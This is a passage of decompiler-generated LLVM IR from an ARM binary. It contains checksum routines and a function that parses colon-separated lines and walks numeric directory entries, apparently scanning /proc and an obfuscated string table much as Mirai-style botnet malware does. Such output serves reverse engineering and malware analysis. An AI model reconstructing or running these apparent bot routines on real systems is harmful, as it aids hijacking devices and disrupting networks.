  %v1_d0f0 = phi i32 [ 0, %dec_label_pc_d0b8 ], [ %v2_d0dc, %dec_label_pc_d0c8 ]
  %v0_d0e8 = phi i32 [ %arg1, %dec_label_pc_d0b8 ], [ %v1_d0d0, %dec_label_pc_d0c8 ]
  %v7_d0e8 = icmp eq i32 %v0_d0e8, 1
  br i1 %v7_d0e8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_d0e8
  %v1_d0ec = load i32, i32* @r0, align 4
  %v2_d0ec = inttoptr i32 %v1_d0ec to i8*
  %v3_d0ec = load i8, i8* %v2_d0ec, align 1
  %v4_d0ec = zext i8 %v3_d0ec to i32
  %v3_d0f0 = add i32 %v1_d0f0, %v4_d0ec
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d0e8, %bb
  %v0_d0f4 = phi i32 [ %v1_d0f0, %dec_label_pc_d0e8 ], [ %v3_d0f0, %bb ]
  %v3_d0f8 = urem i32 %v0_d0f4, 65536
  %v4_d0fc = udiv i32 %v0_d0f4, 65536
  %v5_d0fc = add nuw nsw i32 %v4_d0fc, %v3_d0f8
  %v4_d100 = udiv i32 %v5_d0fc, 65536
  %v5_d100 = add nuw nsw i32 %v4_d100, %v5_d0fc
  %v1_d104 = urem i32 %v5_d100, 65536
  %v3_d10c = xor i32 %v1_d104, 65535
  ret i32 %v3_d10c

; uselistorder directives
  uselistorder i32 %v5_d0fc, { 1, 0 }
  uselistorder i32 %v1_d0e0, { 1, 0 }
  uselistorder i32 %v1_d0d0, { 1, 0, 2 }
  uselistorder i32 %v0_d0e0, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_d114(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d114:
  %v3_d124 = urem i32 %arg2, 65536
  %v1_d128 = add i32 %arg1, 12
  %v1_d12c = inttoptr i32 %v1_d128 to i32*
  %v2_d12c = load i32, i32* %v1_d12c, align 4
  %v3_d12c = add i32 %arg1, 16
  %v4_d12c = inttoptr i32 %v3_d12c to i32*
  %v5_d12c = load i32, i32* %v4_d12c, align 4
  %v7_d130 = icmp sgt i32 %arg3, 1
  br i1 %v7_d130, label %dec_label_pc_d13c.preheader, label %dec_label_pc_d15c

dec_label_pc_d13c.preheader:                      ; preds = %dec_label_pc_d114
  %v0_d13c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_d13c

dec_label_pc_d13c:                                ; preds = %dec_label_pc_d13c.preheader, %dec_label_pc_d13c
  %v0_d150 = phi i32 [ 0, %dec_label_pc_d13c.preheader ], [ %v2_d150, %dec_label_pc_d13c ]
  %v0_d144 = phi i32 [ %arg3, %dec_label_pc_d13c.preheader ], [ %v1_d144, %dec_label_pc_d13c ]
  %v0_d154 = phi i32 [ %v0_d13c.pre, %dec_label_pc_d13c.preheader ], [ %v1_d154, %dec_label_pc_d13c ]
  %v1_d13c = inttoptr i32 %v0_d154 to i8*
  %v2_d13c = load i8, i8* %v1_d13c, align 1
  %v3_d13c = zext i8 %v2_d13c to i32
  %v1_d140 = add i32 %v0_d154, 1
  %v2_d140 = inttoptr i32 %v1_d140 to i8*
  %v3_d140 = load i8, i8* %v2_d140, align 1
  %v4_d140 = zext i8 %v3_d140 to i32
  %v1_d144 = add nsw i32 %v0_d144, -2
  %v4_d148 = mul nuw nsw i32 %v4_d140, 256
  %v5_d148 = or i32 %v4_d148, %v3_d13c
  %v2_d150 = add i32 %v5_d148, %v0_d150
  %v1_d154 = add i32 %v0_d154, 2
  store i32 %v1_d154, i32* @r1, align 4
  %v8_d158 = icmp sgt i32 %v1_d144, 1
  br i1 %v8_d158, label %dec_label_pc_d13c, label %dec_label_pc_d15c

dec_label_pc_d15c:                                ; preds = %dec_label_pc_d13c, %dec_label_pc_d114
  %v1_d164 = phi i32 [ 0, %dec_label_pc_d114 ], [ %v2_d150, %dec_label_pc_d13c ]
  %v0_d15c = phi i32 [ %arg3, %dec_label_pc_d114 ], [ %v1_d144, %dec_label_pc_d13c ]
  %v7_d15c = icmp eq i32 %v0_d15c, 1
  br i1 %v7_d15c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_d15c
  %v1_d160 = load i32, i32* @r1, align 4
  %v2_d160 = inttoptr i32 %v1_d160 to i8*
  %v3_d160 = load i8, i8* %v2_d160, align 1
  %v4_d160 = zext i8 %v3_d160 to i32
  %v3_d164 = add i32 %v4_d160, %v1_d164
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d15c, %bb
  %v0_d188 = phi i32 [ %v1_d164, %dec_label_pc_d15c ], [ %v3_d164, %bb ]
  %v3_d16c = urem i32 %v2_d12c, 65536
  %v1_d174 = add i32 %arg1, 9
  %v2_d174 = inttoptr i32 %v1_d174 to i8*
  %v3_d174 = load i8, i8* %v2_d174, align 1
  %v4_d174 = zext i8 %v3_d174 to i32
  %v3_d178 = urem i32 %v5_d12c, 65536
  %v4_d17c = udiv i32 %v2_d12c, 65536
  %v3_d184 = mul nuw nsw i32 %v4_d174, 256
  %v4_d188 = udiv i32 %v5_d12c, 65536
  %v5_d188 = add i32 %v0_d188, %v4_d188
  %v2_d18c = add i32 %v5_d188, %v3_d184
  %v5_d17c = add nuw nsw i32 %v3_d16c, %v3_d124
  %v2_d180 = add nuw nsw i32 %v5_d17c, %v4_d17c
  %v2_d190 = add nuw nsw i32 %v2_d180, %v3_d178
  %v2_d194 = add i32 %v2_d18c, %v2_d190
  %tmp = icmp ult i32 %v2_d194, 65536
  br i1 %tmp, label %dec_label_pc_d1b4, label %dec_label_pc_d1a0

dec_label_pc_d1a0:                                ; preds = %.thread, %dec_label_pc_d1a0
  %v2_d1a81 = phi i32 [ %v2_d1a8, %dec_label_pc_d1a0 ], [ %v2_d194, %.thread ]
  %v3_d1ac2.in = phi i32 [ %v2_d1a8, %dec_label_pc_d1a0 ], [ %v2_d194, %.thread ]
  %v3_d1ac2 = udiv i32 %v3_d1ac2.in, 65536
  %v3_d1a4 = urem i32 %v2_d1a81, 65536
  %v2_d1a8 = add nuw nsw i32 %v3_d1a4, %v3_d1ac2
  %tmp14 = icmp ult i32 %v2_d1a8, 65536
  br i1 %tmp14, label %dec_label_pc_d1b4.loopexit, label %dec_label_pc_d1a0

dec_label_pc_d1b4.loopexit:                       ; preds = %dec_label_pc_d1a0
  br label %dec_label_pc_d1b4

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d1b4.loopexit, %.thread
  %v0_d1b4 = phi i32 [ %v2_d1a8, %dec_label_pc_d1b4.loopexit ], [ %v2_d194, %.thread ]
  %v1_d1b4 = urem i32 %v0_d1b4, 65536
  %v3_d1bc = xor i32 %v1_d1b4, 65535
  ret i32 %v3_d1bc

; uselistorder directives
  uselistorder i32 %v2_d1a8, { 2, 1, 3, 0 }
  uselistorder i32 %v2_d194, { 3, 0, 2, 1 }
  uselistorder i32 %v1_d164, { 1, 0 }
  uselistorder i32 %v1_d154, { 1, 0 }
  uselistorder i32 %v1_d144, { 0, 2, 1 }
  uselistorder i32 %v0_d154, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d1a0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_d13c, { 1, 0 }
}

define i32 @function_d1c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_d1c4:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d1c4 = load i32, i32* @r4, align 4
  store i32 %v3_d1c4, i32* %stack_var_-36, align 4
  %v6_d1c4 = load i32, i32* @r5, align 4
  %v9_d1c4 = load i32, i32* @r6, align 4
  %v12_d1c4 = load i32, i32* @r7, align 4
  %v15_d1c4 = load i32, i32* @r8, align 4
  %v18_d1c4 = load i32, i32* @sb, align 4
  %v21_d1c4 = load i32, i32* @sl, align 4
  %v24_d1c4 = load i32, i32* @fp, align 4
  %v2_d1d8 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_d1d8, i32* @sl, align 4
  %v3_d1e0 = mul i32 %arg1, 65536
  store i32 %v3_d1e0, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_d1ec = ptrtoint i32* %stack_var_-8773 to i32
  %v2_d1f8 = bitcast i32* %stack_var_-4677 to i8*
  %v3_d1f8 = call i32 @function_12130(i8* %v2_d1f8, i32 0)
  store i32 4096, i32* @r2, align 4
  %v2_d210 = bitcast i32* %stack_var_-8773 to i8*
  %v3_d210 = call i32 @function_12130(i8* %v2_d210, i32 0)
  %v2_d214 = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_d214, i32* @r6, align 4
  store i32 513, i32* @r2, align 4
  %v3_d234 = call i32 @function_12130(i8* nonnull %stack_var_-581, i32 0)
  %v2_d238 = ptrtoint i8* %stack_var_-68 to i32
  %v1_d240 = load i32, i32* @r5, align 4
  %v4_d240 = udiv i32 %v1_d240, 16777216
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_d260 = trunc i32 %v4_d240 to i8
  %v4_d260 = call i32 @function_11650(i8 %v3_d260, i32 16, i32 %v2_d238)
  %v2_d268 = call i32 @function_111ec(i8* nonnull %stack_var_-68)
  %v7_d26c = icmp eq i32 %v2_d268, 2
  br i1 %v7_d26c, label %dec_label_pc_d734, label %dec_label_pc_d274

dec_label_pc_d274:                                ; preds = %dec_label_pc_d1c4, %dec_label_pc_d734
  %v1_d278 = call i32 @function_10c20(i32 13)
  %v1_d280 = call i32 @function_10c20(i32 14)
  %v1_d288 = call i32 @function_10c20(i32 15)
  %v1_d290 = call i32 @function_10c20(i32 17)
  %v0_d294 = load i32, i32* @r4, align 4
  %v2_d29c = inttoptr i32 %v0_d294 to i32*
  %v3_d29c = call i32 @function_10b3c(i32 17, i32* %v2_d29c)
  %v0_d2a0 = load i32, i32* @r4, align 4
  %v2_d2a4 = inttoptr i32 %v3_d29c to i8*
  %v3_d2a4 = call i32 @function_11c1c(i8* %v2_d2a4, i32 %v0_d2a0)
  %v7_d2a8 = icmp eq i32 %v3_d2a4, -1
  store i32 %v3_d2a4, i32* @r8, align 4
  br i1 %v7_d2a8, label %dec_label_pc_d6d0, label %dec_label_pc_d2b4.preheader

dec_label_pc_d2b4.preheader:                      ; preds = %dec_label_pc_d274
  %v4_d2c058 = call i32 @function_11444(i8* nonnull %stack_var_-581, i32 512, i32 %v3_d2a4)
  %v2_d2c460 = icmp eq i32 %v4_d2c058, 0
  br i1 %v2_d2c460, label %dec_label_pc_d454.loopexit, label %dec_label_pc_d2cc.lr.ph

dec_label_pc_d2cc.lr.ph:                          ; preds = %dec_label_pc_d2b4.preheader
  %v2_d314 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_d2cc

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d2cc.lr.ph, %dec_label_pc_d2b4.backedge
  %v3_d2d0 = load i8, i8* %stack_var_-581, align 1
  %v4_d2d0 = sext i8 %v3_d2d0 to i32
  %v2_d2d4 = icmp eq i8 %v3_d2d0, 0
  br i1 %v2_d2d4, label %bb126, label %bb

bb:                                               ; preds = %dec_label_pc_d2cc
  %v8_d2d8 = icmp eq i8 %v3_d2d0, 58
  br i1 %v8_d2d8, label %.thread6, label %dec_label_pc_d2ec

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_d304

bb126:                                            ; preds = %dec_label_pc_d2cc
  br label %dec_label_pc_d304

dec_label_pc_d2ec:                                ; preds = %bb
  %v1_d2f4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_d2f0

dec_label_pc_d2f0:                                ; preds = %bb127, %dec_label_pc_d2ec
  %v0_d2f0 = phi i32 [ %v1_d2f0, %bb127 ], [ 0, %dec_label_pc_d2ec ]
  %v1_d2f0 = add i32 %v0_d2f0, 1
  %v2_d2f4 = add i32 %v1_d2f0, %v1_d2f4.pre
  %v3_d2f4 = inttoptr i32 %v2_d2f4 to i8*
  %v4_d2f4 = load i8, i8* %v3_d2f4, align 1
  %v6_d2f4 = zext i8 %v4_d2f4 to i32
  %v2_d2f8 = icmp eq i8 %v4_d2f4, 0
  br i1 %v2_d2f8, label %dec_label_pc_d304, label %bb127

bb127:                                            ; preds = %dec_label_pc_d2f0
  %v8_d2fc = icmp eq i8 %v4_d2f4, 58
  br i1 %v8_d2fc, label %dec_label_pc_d304, label %dec_label_pc_d2f0

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2f0, %bb127, %bb126, %.thread6
  %v1_d330 = phi i32 [ 0, %.thread6 ], [ 0, %bb126 ], [ %v1_d2f0, %bb127 ], [ %v1_d2f0, %dec_label_pc_d2f0 ]
  %v0_d304 = phi i32 [ %v4_d2d0, %.thread6 ], [ %v4_d2d0, %bb126 ], [ %v6_d2f4, %bb127 ], [ %v6_d2f4, %dec_label_pc_d2f0 ]
  %v2_d304 = icmp eq i32 %v0_d304, 0
  br i1 %v2_d304, label %dec_label_pc_d2b4.backedge, label %dec_label_pc_d30c

dec_label_pc_d2b4.backedge:                       ; preds = %dec_label_pc_d304, %dec_label_pc_d3dc, %dec_label_pc_d428, %dec_label_pc_d350
  %v0_d2bc = load i32, i32* @r8, align 4
  %v4_d2c0 = call i32 @function_11444(i8* nonnull %stack_var_-581, i32 512, i32 %v0_d2bc)
  %v2_d2c4 = icmp eq i32 %v4_d2c0, 0
  br i1 %v2_d2c4, label %dec_label_pc_d454.loopexit, label %dec_label_pc_d2cc

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d304
  %v1_d310 = add i32 %v1_d330, 2
  %v2_d318 = add i32 %v1_d310, %v2_d314
  %v1_d31c = add i32 %v2_d318, -545
  %v2_d31c = inttoptr i32 %v1_d31c to i8*
  %v3_d31c = load i8, i8* %v2_d31c, align 1
  %v2_d320 = icmp eq i8 %v3_d31c, 0
  br i1 %v2_d320, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_d30c
  %v8_d324 = icmp eq i8 %v3_d31c, 32
  br i1 %v8_d324, label %.thread10, label %dec_label_pc_d330

.thread10:                                        ; preds = %bb128
  store i32 %v1_d310, i32* @r5, align 4
  br label %dec_label_pc_d350

bb129:                                            ; preds = %dec_label_pc_d30c
  store i32 %v1_d310, i32* @r5, align 4
  br label %dec_label_pc_d350

dec_label_pc_d330:                                ; preds = %bb128
  %v0_d330 = load i32, i32* @r6, align 4
  %v2_d330 = add i32 %v0_d330, %v1_d330
  br label %dec_label_pc_d334

dec_label_pc_d334:                                ; preds = %bb130, %dec_label_pc_d330
  %v0_d34013 = phi i32 [ %v1_d340, %bb130 ], [ %v2_d330, %dec_label_pc_d330 ]
  %v1_d334 = add i32 %v0_d34013, 3
  %v2_d334 = inttoptr i32 %v1_d334 to i8*
  %v3_d334 = load i8, i8* %v2_d334, align 1
  %v2_d338 = icmp eq i8 %v3_d334, 0
  br i1 %v2_d338, label %.thread12, label %bb130

.thread12:                                        ; preds = %dec_label_pc_d334
  %v1_d34014 = add i32 %v0_d34013, 1
  br label %dec_label_pc_d348

bb130:                                            ; preds = %dec_label_pc_d334
  %v8_d33c = icmp eq i8 %v3_d334, 32
  %v1_d340 = add i32 %v0_d34013, 1
  br i1 %v8_d33c, label %dec_label_pc_d348, label %dec_label_pc_d334

dec_label_pc_d348:                                ; preds = %bb130, %.thread12
  %v1_d34015 = phi i32 [ %v1_d34014, %.thread12 ], [ %v1_d340, %bb130 ]
  %v2_d348 = sub i32 %v1_d34015, %v0_d330
  %v1_d34c = add i32 %v2_d348, 2
  store i32 %v1_d34c, i32* @r5, align 4
  br label %dec_label_pc_d350

dec_label_pc_d350:                                ; preds = %bb129, %.thread10, %dec_label_pc_d348
  %v1_d35c = phi i32 [ %v1_d310, %.thread10 ], [ %v1_d310, %bb129 ], [ %v1_d34c, %dec_label_pc_d348 ]
  %v0_d350 = load i32, i32* @r6, align 4
  %v2_d350 = add i32 %v0_d350, %v1_d310
  store i32 %v2_d350, i32* @r4, align 4
  %v2_d35c = add i32 %v1_d35c, %v2_d314
  store i32 0, i32* @r7, align 4
  %v3_d368 = add i32 %v2_d35c, -545
  %v4_d368 = inttoptr i32 %v3_d368 to i8*
  store i8 0, i8* %v4_d368, align 1
  %v1_d36c = inttoptr i32 %v2_d350 to i8*
  %v2_d36c = call i32 @function_111ec(i8* %v1_d36c)
  store i32 %v2_d36c, i32* @r1, align 4
  %v0_d378 = load i32, i32* @r4, align 4
  %v3_d37c = inttoptr i32 %v0_d378 to i8*
  %v4_d37c = call i32 @function_11540(i8* %v3_d37c, i32 %v2_d36c, i32 %v2_d238)
  %v7_d380 = icmp eq i32 %v4_d37c, -1
  br i1 %v7_d380, label %dec_label_pc_d2b4.backedge, label %dec_label_pc_d39c.preheader

dec_label_pc_d39c.preheader:                      ; preds = %dec_label_pc_d350
  %v1_d384 = load i32, i32* @r7, align 4
  %v1_d388 = load i32, i32* @r6, align 4
  %v2_d388 = load i32, i32* @r5, align 4
  %v3_d388 = add i32 %v2_d388, %v1_d388
  store i32 %v1_d384, i32* @lr, align 4
  store i32 %v1_d384, i32* @r4, align 4
  %v1_d39c50 = add i32 %v3_d388, 2
  %v2_d39c51 = inttoptr i32 %v1_d39c50 to i8*
  %v3_d39c52 = load i8, i8* %v2_d39c51, align 1
  %v2_d3a054 = icmp eq i8 %v3_d39c52, 0
  %v1_d3a456 = add i32 %v2_d388, 2
  br i1 %v2_d3a054, label %dec_label_pc_d3dc, label %dec_label_pc_d3ac

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d39c.preheader, %dec_label_pc_d39c.backedge
  %v0_d3dc86 = phi i32 [ %v0_d3dc85, %dec_label_pc_d39c.backedge ], [ %v1_d384, %dec_label_pc_d39c.preheader ]
  %v0_d3c4.pr = phi i32 [ %v0_d3c4.pr71, %dec_label_pc_d39c.backedge ], [ %v1_d384, %dec_label_pc_d39c.preheader ]
  %v0_d6e0 = phi i32 [ %v0_d6e074, %dec_label_pc_d39c.backedge ], [ %v1_d384, %dec_label_pc_d39c.preheader ]
  %v0_d3a482 = phi i32 [ %v1_d3a4, %dec_label_pc_d39c.backedge ], [ %v1_d3a456, %dec_label_pc_d39c.preheader ]
  %v0_d3d4 = phi i32 [ %v0_d39c, %dec_label_pc_d39c.backedge ], [ %v3_d388, %dec_label_pc_d39c.preheader ]
  %v1_d3b0.in = phi i8 [ %v3_d39c, %dec_label_pc_d39c.backedge ], [ %v3_d39c52, %dec_label_pc_d39c.preheader ]
  %v7_d3ac = icmp eq i8 %v1_d3b0.in, 9
  br i1 %v7_d3ac, label %.thread23, label %bb131

bb131:                                            ; preds = %dec_label_pc_d3ac
  %v8_d3b0 = icmp eq i8 %v1_d3b0.in, 32
  br i1 %v8_d3b0, label %.thread23.thread35, label %dec_label_pc_d3c4

.thread23.thread35:                               ; preds = %bb131
  br label %dec_label_pc_d3d0

.thread23:                                        ; preds = %dec_label_pc_d3ac
  br label %dec_label_pc_d3d0

dec_label_pc_d3c4:                                ; preds = %bb131
  %v7_d3c4 = icmp eq i32 %v0_d3c4.pr, 1
  br i1 %v7_d3c4, label %dec_label_pc_d6e0, label %dec_label_pc_d3cc

dec_label_pc_d3cc:                                ; preds = %dec_label_pc_d6e0, %dec_label_pc_d3c4
  %v0_d3d079 = phi i32 [ %v1_d6e0, %dec_label_pc_d6e0 ], [ %v0_d6e0, %dec_label_pc_d3c4 ]
  br label %dec_label_pc_d3d0

dec_label_pc_d3d0:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_d3cc
  %v0_d3d0 = phi i32 [ %v0_d6e0, %.thread23.thread35 ], [ %v0_d6e0, %.thread23 ], [ %v0_d3d079, %dec_label_pc_d3cc ]
  %v0_d3c4.pr72 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_d3cc ]
  %v7_d3d8 = icmp sgt i32 %v0_d3d0, 6
  br i1 %v7_d3d8, label %dec_label_pc_d3dc, label %dec_label_pc_d39c.backedge

dec_label_pc_d3dc:                                ; preds = %dec_label_pc_d39c.backedge, %dec_label_pc_d3d0, %dec_label_pc_d39c.preheader
  %v1_d42c = phi i32 [ %v1_d3a456, %dec_label_pc_d39c.preheader ], [ %v1_d3a4, %dec_label_pc_d39c.backedge ], [ %v0_d3a482, %dec_label_pc_d3d0 ]
  %v0_d3dc = phi i32 [ %v1_d384, %dec_label_pc_d39c.preheader ], [ %v0_d3dc85, %dec_label_pc_d39c.backedge ], [ %v0_d3dc86, %dec_label_pc_d3d0 ]
  %v2_d3dc = icmp eq i32 %v0_d3dc, 0
  br i1 %v2_d3dc, label %dec_label_pc_d2b4.backedge, label %dec_label_pc_d3e8

dec_label_pc_d3e8:                                ; preds = %dec_label_pc_d3dc
  %v2_d3f0 = add i32 %v1_d42c, %v2_d314
  %v1_d3f4 = add i32 %v2_d3f0, -545
  %v2_d3f4 = inttoptr i32 %v1_d3f4 to i8*
  %v3_d3f4 = load i8, i8* %v2_d3f4, align 1
  %v2_d3f8 = icmp eq i8 %v3_d3f4, 0
  br i1 %v2_d3f8, label %dec_label_pc_d428, label %bb132

bb132:                                            ; preds = %dec_label_pc_d3e8
  %v8_d3fc = icmp eq i8 %v3_d3f4, 32
  br i1 %v8_d3fc, label %dec_label_pc_d428, label %dec_label_pc_d404

dec_label_pc_d404:                                ; preds = %bb132
  %v2_d404 = add i32 %v1_d42c, %v1_d388
  br label %dec_label_pc_d408

dec_label_pc_d408:                                ; preds = %bb133, %dec_label_pc_d404
  %v0_d41428 = phi i32 [ %v1_d414, %bb133 ], [ %v1_d42c, %dec_label_pc_d404 ]
  %v0_d408 = phi i32 [ %v1_d408, %bb133 ], [ %v2_d404, %dec_label_pc_d404 ]
  %v1_d408 = add i32 %v0_d408, 1
  %v2_d408 = inttoptr i32 %v1_d408 to i8*
  %v3_d408 = load i8, i8* %v2_d408, align 1
  %v2_d40c = icmp eq i8 %v3_d408, 0
  br i1 %v2_d40c, label %.thread27, label %bb133

.thread27:                                        ; preds = %dec_label_pc_d408
  %v1_d41429 = add i32 %v0_d41428, 1
  br label %dec_label_pc_d41c

bb133:                                            ; preds = %dec_label_pc_d408
  %v8_d410 = icmp eq i8 %v3_d408, 32
  %v1_d414 = add i32 %v0_d41428, 1
  br i1 %v8_d410, label %dec_label_pc_d41c, label %dec_label_pc_d408

dec_label_pc_d41c:                                ; preds = %bb133, %.thread27
  %v1_d424 = phi i32 [ %v1_d41429, %.thread27 ], [ %v1_d414, %bb133 ]
  %v2_d424 = add i32 %v1_d424, %v2_d314
  br label %dec_label_pc_d428

dec_label_pc_d428:                                ; preds = %dec_label_pc_d3e8, %bb132, %dec_label_pc_d41c
  %v2_d434 = phi i32 [ %v2_d3f0, %dec_label_pc_d3e8 ], [ %v2_d3f0, %bb132 ], [ %v2_d424, %dec_label_pc_d41c ]
  %v2_d42c = add i32 %v1_d42c, %v1_d388
  store i32 %v2_d42c, i32* @r4, align 4
  %v3_d434 = add i32 %v2_d434, -545
  %v4_d434 = inttoptr i32 %v3_d434 to i8*
  store i8 0, i8* %v4_d434, align 1
  %v1_d438 = inttoptr i32 %v2_d42c to i8*
  %v2_d438 = call i32 @function_111ec(i8* %v1_d438)
  %v8_d440 = icmp sgt i32 %v2_d438, 15
  br i1 %v8_d440, label %dec_label_pc_d2b4.backedge, label %dec_label_pc_d444

dec_label_pc_d444:                                ; preds = %dec_label_pc_d428
  %v0_d448 = load i32, i32* @r4, align 4
  %v2_d44c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_d44c, i32* @r0, align 4
  %v2_d450 = bitcast i32* %stack_var_-52 to i8*
  %v3_d450 = call i32 @function_11214(i8* %v2_d450, i32 %v0_d448)
  br label %dec_label_pc_d454

dec_label_pc_d454.loopexit:                       ; preds = %dec_label_pc_d2b4.backedge, %dec_label_pc_d2b4.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre95 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_d454

dec_label_pc_d454:                                ; preds = %dec_label_pc_d454.loopexit, %dec_label_pc_d444
  %v1_d464.pre-phi = phi i8* [ %.pre95, %dec_label_pc_d454.loopexit ], [ %v2_d450, %dec_label_pc_d444 ]
  %v2_d460.pre-phi = phi i32 [ %.pre, %dec_label_pc_d454.loopexit ], [ %v2_d44c, %dec_label_pc_d444 ]
  %v0_d454 = load i32, i32* @r8, align 4
  %v1_d458 = call i32 @function_11af0(i32 %v0_d454)
  %v2_d464 = call i32 @function_111ec(i8* %v1_d464.pre-phi)
  store i32 %v2_d464, i32* @r4, align 4
  %v2_d468 = icmp eq i32 %v2_d464, 0
  br i1 %v2_d468, label %dec_label_pc_d710, label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d454
  %v3_d478 = call i32 @function_10b3c(i32 13, i32* null)
  store i32 %v3_d478, i32* @r0, align 4
  %v1_d47c = call i32 @function_11ef8(i32 %v3_d478)
  store i32 %v1_d47c, i32* @r8, align 4
  %v2_d480 = icmp eq i32 %v1_d47c, 0
  br i1 %v2_d480, label %dec_label_pc_d6b0, label %dec_label_pc_d490.preheader

dec_label_pc_d490.preheader:                      ; preds = %dec_label_pc_d470
  store i32 0, i32* @r5, align 4
  %v1_d49445 = inttoptr i32 %v1_d47c to i32*
  %v2_d49446 = call i32 @function_11ff4(i32* %v1_d49445)
  %v2_d49848 = icmp eq i32 %v2_d49446, 0
  br i1 %v2_d49848, label %dec_label_pc_d6a4, label %dec_label_pc_d4a0.preheader

dec_label_pc_d490.loopexit:                       ; preds = %dec_label_pc_d4a8, %dec_label_pc_d4bc, %dec_label_pc_d524
  %v0_d490 = load i32, i32* @r8, align 4
  %v1_d494 = inttoptr i32 %v0_d490 to i32*
  %v2_d494 = call i32 @function_11ff4(i32* %v1_d494)
  %v2_d498 = icmp eq i32 %v2_d494, 0
  br i1 %v2_d498, label %dec_label_pc_d6a4, label %dec_label_pc_d4a0.preheader

dec_label_pc_d4a0.preheader:                      ; preds = %dec_label_pc_d490.preheader, %dec_label_pc_d490.loopexit
  %v0_d4a894 = phi i32 [ %v2_d494, %dec_label_pc_d490.loopexit ], [ %v2_d49446, %dec_label_pc_d490.preheader ]
  br label %dec_label_pc_d4a0

dec_label_pc_d4a0:                                ; preds = %dec_label_pc_d4a0.preheader, %dec_label_pc_d68c
  %v0_d4b4 = phi i32 [ %v0_d4a894, %dec_label_pc_d4a0.preheader ], [ %v2_d698, %dec_label_pc_d68c ]
  %v0_d4a0 = load i32, i32* @r5, align 4
  %v2_d4a0 = icmp eq i32 %v0_d4a0, 0
  br i1 %v2_d4a0, label %dec_label_pc_d4a8, label %dec_label_pc_d6a4

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d4a0
  %v1_d4a8 = add i32 %v0_d4b4, 11
  %v2_d4a8 = inttoptr i32 %v1_d4a8 to i8*
  %v3_d4a8 = load i8, i8* %v2_d4a8, align 1
  %v4_d4a8 = zext i8 %v3_d4a8 to i32
  %v1_d4ac = add nsw i32 %v4_d4a8, -48
  store i32 %v1_d4a8, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_d4ac, 9
  br i1 %tmp, label %dec_label_pc_d490.loopexit, label %dec_label_pc_d4bc

dec_label_pc_d4bc:                                ; preds = %dec_label_pc_d4a8
  %v3_d4c4 = call i32 @function_10b3c(i32 13, i32* null)
  store i32 %v2_d1d8, i32* @r0, align 4
  %v3_d4d0 = call i32 @function_11214(i8* %v2_d1f8, i32 %v3_d4c4)
  %v2_d4d8 = call i32 @function_111ec(i8* %v2_d1f8)
  %v0_d4dc = load i32, i32* @r7, align 4
  %v0_d4e0 = load i32, i32* @sl, align 4
  %v2_d4e0 = add i32 %v0_d4e0, %v2_d4d8
  store i32 %v2_d4e0, i32* @r0, align 4
  %v2_d4e4 = inttoptr i32 %v2_d4e0 to i8*
  %v3_d4e4 = call i32 @function_11214(i8* %v2_d4e4, i32 %v0_d4dc)
  %v2_d4ec = call i32 @function_111ec(i8* %v2_d1f8)
  %v0_d4f0 = load i32, i32* @r5, align 4
  store i32 %v2_d4ec, i32* @r4, align 4
  %v2_d4fc = inttoptr i32 %v0_d4f0 to i32*
  %v3_d4fc = call i32 @function_10b3c(i32 14, i32* %v2_d4fc)
  %v0_d504 = load i32, i32* @sl, align 4
  %v1_d504 = load i32, i32* @r4, align 4
  %v2_d504 = add i32 %v1_d504, %v0_d504
  store i32 %v2_d504, i32* @r0, align 4
  %v2_d508 = inttoptr i32 %v2_d504 to i8*
  %v3_d508 = call i32 @function_11214(i8* %v2_d508, i32 %v3_d4fc)
  %v4_d518 = call i32 @function_11ce4(i8* %v2_d1f8, i32 %v2_d1ec, i32 4096)
  %v7_d51c = icmp eq i32 %v4_d518, -1
  br i1 %v7_d51c, label %dec_label_pc_d490.loopexit, label %dec_label_pc_d524

dec_label_pc_d524:                                ; preds = %dec_label_pc_d4bc
  %v0_d524 = load i32, i32* @r5, align 4
  %v2_d52c = inttoptr i32 %v0_d524 to i32*
  %v3_d52c = call i32 @function_10b3c(i32 13, i32* %v2_d52c)
  store i32 %v2_d1d8, i32* @r0, align 4
  %v3_d538 = call i32 @function_11214(i8* %v2_d1f8, i32 %v3_d52c)
  %v2_d540 = call i32 @function_111ec(i8* %v2_d1f8)
  %v0_d544 = load i32, i32* @r7, align 4
  %v0_d548 = load i32, i32* @sl, align 4
  %v2_d548 = add i32 %v0_d548, %v2_d540
